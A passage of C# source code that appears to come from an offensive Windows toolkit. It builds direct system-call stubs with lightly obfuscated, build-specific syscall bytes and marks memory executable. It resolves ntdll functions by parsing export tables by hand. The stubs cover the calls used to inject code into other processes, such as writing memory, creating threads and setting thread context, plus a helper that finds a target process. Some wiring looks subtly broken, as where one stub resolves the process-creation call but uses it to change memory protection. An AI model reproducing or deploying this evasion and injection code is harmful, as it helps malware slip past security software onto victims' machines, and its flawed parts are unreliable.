    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwResumeThreadX( IntPtr ProcessHandle, out ulong SuspendCount );
    public static NTSTATUS ZwResumeThread( IntPtr ProcessHandle, out ulong SuspendCount)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
								ZwResumeThreadX ZwResumeThreadFunc = (ZwResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeThreadX));
                return (NTSTATUS)ZwResumeThreadFunc(ProcessHandle, out SuspendCount);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwOpenThreadX( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid );
		public static NTSTATUS ZwOpenThread( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 8 );
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								UInt32 size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
								ZwOpenThreadX ZwOpenThreadFunc = (ZwOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenThreadX));
								return (NTSTATUS)ZwOpenThreadFunc( out ProcessHandle, processAccess, objAttribute, ref clientid);
						}

				}
		}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessX(ref IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
public static NTSTATUS ZwOpenProcess(ref IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 1 );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
						return (NTSTATUS)ZwOpenProcessFunc(ref ProcessHandle, processAccess, objAttribute, ref clientid);
				}

		}
}






[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ProtectorBB( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect );
public static NTSTATUS ProtectorB( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
{
		IntPtr proc = GetProcAddress(Resolver(), "ZwCreateProcessEx");
		ProtectorBB ProtectorFunc = (ProtectorBB)Marshal.GetDelegateForFunctionPointer(proc, typeof(ProtectorBB));
		return (NTSTATUS)ProtectorFunc( ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect );
}
[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwProtectVirtualMemoryX2( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten);
public static NTSTATUS ZwProtectVirtualMemory1( IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 16 );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = ProtectorB( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwProtectVirtualMemoryX2 ZwProtectVirtualMemoryFunc = (ZwProtectVirtualMemoryX2)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwProtectVirtualMemoryX2));
						return (NTSTATUS)ZwProtectVirtualMemoryFunc( ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
				}
		}
}
[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwCreateProcessExX( out IntPtr ProcessHandle, UInt32 NewAccessProtection, OBJECT_ATTRIBUTES objAttribute, IntPtr ParentProcess, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort, bool unknown );
public static NTSTATUS ZwCreateProcessEx( out IntPtr ProcessHandle, UInt32 NewAccessProtection, OBJECT_ATTRIBUTES objAttribute, IntPtr ParentProcess, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort, bool unknown )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 17 );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ProcessHandle = IntPtr.Zero;
						NTSTATUS status = ZwProtectVirtualMemory1( ProcessHandle /*new IntPtr(-1)*/, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwCreateProcessExX ZwCreateProcessExFunc = (ZwCreateProcessExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateProcessExX));
						return (NTSTATUS)ZwCreateProcessExFunc( out ProcessHandle, NewAccessProtection, objAttribute, ParentProcess, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort, unknown );
				}

		}
}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessTokenX(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle);
public static NTSTATUS ZwOpenProcessToken(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 14 );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwOpenProcessTokenX NtOpenProcessTokenFunc = (ZwOpenProcessTokenX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessTokenX));
						return (NTSTATUS)NtOpenProcessTokenFunc(ProcessHandle, DesiredAccess, ref TokenHandle);
				}
		}
}






		[SuppressUnmanagedCodeSecurity]
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

/*
		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS RtlGetVersionX(ref OSVERSIONINFOEXW lpVersionInformation);
		public static NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation)
		{
				IntPtr proc = GetProcAddress(GetNtDll(), "RtlGetVersion");
				RtlGetVersionX RtlGetVersionFunc = (RtlGetVersionX)Marshal.GetDelegateForFunctionPointer(proc, typeof(RtlGetVersionX));
				return (NTSTATUS)RtlGetVersionFunc(ref lpVersionInformation);
		}
*/








		[DllImport("kernel32", EntryPoint = "CreateProcess")]
		public static extern int CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDriectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

		public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
    {
        var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
        var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
        NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
			  // Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004
        if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
           {
                  // ZwOpenProcess
                  if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateThreadEx
                  if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwWriteVirtualMemory
                  if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwAllocateVirtualMemory
                  if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateSection
                  if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwMapViewOfSection
                  if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateProcess
                  if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwOpenThread
                  if (sysType == 8) {	for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);	Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
									// ZwResumeThread
                  if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwWaitForSingleObject
                  if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwSetContextThread
                  if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x18B); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // ZwGetContextThread
                  if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwClose
                  if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwOpenProcessToken
                  if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // ZwSuspendThread
                  if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1BC); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
									// ZwProtectVirtualMemory
									if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwCreateProcessEx
									if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
            } else

                  if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
                  {
                    // NtOpenProcess
                    if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // NtCreateThreadEx
                    if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwWriteVirtualMemory
                    if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // NtAllocateVirtualMemory
                    if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwCreateSection
                    if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwMapViewOfSection
                    if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwCreateProcess
                    if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwOpenThread
                    if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwResumeThread
                    if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwWaitForSingleObject
                    if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwSetContextThread
                    if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwGetContextThread
                    if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwClose
                    if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwOpenProcessToken
                    if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x123); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwSuspendThread
                    if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
										// ZwProtectVirtualMemory
										if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
              } else

                    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                    {
                          // ZwOpenProcess
                          if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateThreadEx
                          if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWriteVirtualMemory
                          if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwAllocateVirtualMemory
                          if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateSection
                          if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwMapViewOfSection
                          if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateProcess
                          if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenThread
                          if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwResumeThread
                          if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWaitForSingleObject
                          if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwSetContextThread
                          if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwGetContextThread
                          if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwClose
                          if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenProcessToken
                          if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x121); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwSuspendThread
                          if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
													// ZwProtectVirtualMemory
													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                    } else

                      if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                      {
                          // ZwOpenProcess
                          if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateThreadEx
                          if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWriteVirtualMemory
                          if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwAllocateVirtualMemory
                          if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateSection
                          if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwMapViewOfSection
                          if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateProcess
                          if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenThread
                          if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwResumeThread
                          if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWaitForSingleObject
                          if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwSetContextThread
                          if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x184); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwGetContextThread
                          if (sysType == 12) { syscall[4] = 237; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwClose
                          if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenProcessToken
                          if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x122); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwSuspendThread
                          if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B5); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
													// ZwProtectVirtualMemory
													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
											} // 1809

                      return syscall;
        }


				public static byte [] Helper(string _P1)
		    {
		        byte [] _L1 = new byte [1];
		        int _N1 = 0;
		        string _N2 = "";
		        int _N3 = 0;
		        int _N4 = 0;
		        for (int i = 1; i <= _P1.Length; i++) { if (_P1.Substring(_N3, 1) == " ") { _N1++; }
		            else if (_P1.Substring(_N3, 1) == "|" || _P1.Substring(_N3,1) == "/") { if (_N1 > 0) { _N2 = _N2 + _N1.ToString(); _N1 = 0; } }
		            else if (_P1.Substring(_N3, 1) == "-") { _N2 = _N2 + "0"; _N1 = 0; }
		            else if (_P1.Substring(_N3, 1) == "?") { if (_P1.Substring(_N3 - 1, 1) == "?" || _P1.Substring(_N3 - 1, 1) == "-")
		            {
		                Array.Resize(ref _L1, _N4 + 1);
		                _L1[_N4] = Byte.Parse( _N2 );
		                _N2 = "";
		                _N1 = 0;
		                _N4++;
		            }
		            else {
		                Array.Resize(ref _L1, _N4 + 1);
		                _L1[_N4] = Byte.Parse( _N2 + _N1.ToString() );
		                _N2 = "";
		                _N1 = 0;
		                _N4++;
		            } }
		            _N3++;
		        }
		        return _L1;
		    }


		    private static string GetProcessUser(Process process)
		    {
		        IntPtr processHandle = IntPtr.Zero;
		        try
		        {
		            ZwOpenProcessToken(process.Handle, 8, ref processHandle);
		            WindowsIdentity wi = new WindowsIdentity(processHandle);
		            string user = wi.Name;
		            return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
		        }
		        catch
		        {
		            return null;
		        }
		        finally
		        {
		            if (processHandle != IntPtr.Zero)
		            {
		                ZwClose(processHandle);
		            }
		        }
		    }


		    public static int FindUserPID(string procName)
		    {
		        string owner;
		        Process proc;
		        int foundPID = 0;
		        Process[] processList = Process.GetProcesses();
		        foreach (Process process in processList)
		        {
		            if (process.ProcessName == procName) {
		                proc = Process.GetProcessById(process.Id);
		                owner = GetProcessUser(proc);
		                if (owner == Environment.UserName ) {
		                    foundPID = process.Id;
		                    break;
		                }
		          }
		      }
		      return foundPID;
		    }


private static IntPtr GetNtDllKernel()
{
		return LoadLibrary("kernel32.dll");
}

private static IntPtr Resolver()
{
		return LoadLibrary("ntdll.dll");
}

private static IntPtr GetKernelbase()
{
		return LoadLibrary("Kernelbase.dll");
}

public static IntPtr LoadLibrary(string name)
{
		return CustomLoadLibrary.GetDllAddress(name, true);
}


public class CustomLoadLibrary
{
		/// <summary>
		/// Resolves LdrLoadDll and uses that function to load a DLL from disk.
		/// </summary>
		/// <author>Ruben Boonen (@FuzzySec)</author>
		/// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
		/// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
		public static IntPtr LoadModuleFromDisk(string DLLPath)
		{
				UNICODE_STRING uModuleName = new UNICODE_STRING();
				RtlInitUnicodeString(ref uModuleName, DLLPath);

				IntPtr hModule = IntPtr.Zero;
				NTSTATUS CallResult = (NTSTATUS) LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
				if (CallResult != NTSTATUS.Success || hModule == IntPtr.Zero)
				{
						return IntPtr.Zero;
				}

				return hModule;
		}

		public static IntPtr GetDllAddress(string DLLName, bool CanLoadFromDisk = false)
		{
				IntPtr hModule = GetLoadedModuleAddress(DLLName);
				if (hModule == IntPtr.Zero && CanLoadFromDisk)
				{
						hModule = LoadModuleFromDisk(DLLName);
						if (hModule == IntPtr.Zero)
						{
								throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
						}
				}
				else if (hModule == IntPtr.Zero)
				{
						throw new DllNotFoundException(DLLName + ", Dll was not found.");
				}

				return hModule;
		}

		/// <summary>
		/// Helper for getting the pointer to a function from a DLL loaded by the process.
		/// </summary>
		/// <author>Ruben Boonen (@FuzzySec)</author>
		/// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
		/// <param name="FunctionName">Name of the exported procedure.</param>
		/// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
		/// <returns>IntPtr for the desired function.</returns>
		public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
		{
				IntPtr hModule = GetLoadedModuleAddress(DLLName);
				if (hModule == IntPtr.Zero && CanLoadFromDisk)
				{
						hModule = LoadModuleFromDisk(DLLName);
						if (hModule == IntPtr.Zero)
						{
								throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
						}
				}
				else if (hModule == IntPtr.Zero)
				{
						throw new DllNotFoundException(DLLName + ", Dll was not found.");
				}

				return GetExportAddress(hModule, FunctionName);
		}

		/// <summary>
		/// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing.
		/// </summary>
		/// <author>Ruben Boonen (@FuzzySec)</author>
		/// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
		/// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
		public static IntPtr GetLoadedModuleAddress(string DLLName)
		{
				ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
				foreach (ProcessModule Mod in ProcModules)
				{
						if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
						{
								return Mod.BaseAddress;
						}
				}

				return IntPtr.Zero;
		}
		/// <summary>
		/// Given a module base address, resolve the address of a function by manually walking the module export table.
		/// </summary>
		/// <author>Ruben Boonen (@FuzzySec)</author>
		/// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
		/// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
		/// <returns>IntPtr for the desired function.</returns>
		public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
		{
				IntPtr FunctionPtr = IntPtr.Zero;
				try
				{
						// Traverse the PE header in memory
						Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
						Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
						Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
						Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
						Int64 pExport = 0;
						if (Magic == 0x010b)
						{
								pExport = OptHeader + 0x60;
						}
						else
						{
								pExport = OptHeader + 0x70;
						}

						// Read -> IMAGE_EXPORT_DIRECTORY
						Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
						Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
						Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
						Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
						Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
						Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
						Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

						// Loop the array of export name RVA's
						for (int i = 0; i < NumberOfNames; i++)
						{
								String FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
								if (FunctionName.ToLower() == ExportName.ToLower())
								{
										Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
										Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
										FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
										break;
								}
						}
				}
				catch
				{
						// Catch parser failure
						throw new InvalidOperationException("Failed to parse module exports.");
				}

				if (FunctionPtr == IntPtr.Zero)
				{
						// Export not found
						throw new MissingMethodException(ExportName + ", export not found.");
				}
				return FunctionPtr;
		}
}

public static IntPtr GetProcAddress(IntPtr hModule, string procName)
{
		return CustomLoadLibrary.GetExportAddress(hModule, procName);
}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
